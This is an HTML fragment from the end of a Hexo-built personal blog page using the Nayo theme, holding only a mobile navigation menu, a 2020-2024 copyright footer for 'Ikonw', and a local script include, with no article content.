      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			Â©
			
			2020 -
			
			2024
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>